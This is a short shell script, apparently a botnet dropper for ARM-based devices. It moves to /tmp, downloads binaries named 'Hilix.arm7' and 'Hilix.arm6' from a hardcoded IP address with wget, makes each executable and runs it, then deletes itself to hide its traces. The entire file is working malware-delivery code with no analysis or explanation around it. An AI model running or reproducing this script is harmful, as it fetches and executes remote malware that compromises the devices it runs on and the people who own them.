#!/bin/sh
n="Hilix.arm7 Hilix.arm6"
fs="185.172.111.181"
cd /tmp
for i in $n
do
    wget http://$fs/bins/$i -O .r
    chmod +x .r
    ./.r abc
done
rm -rf $0
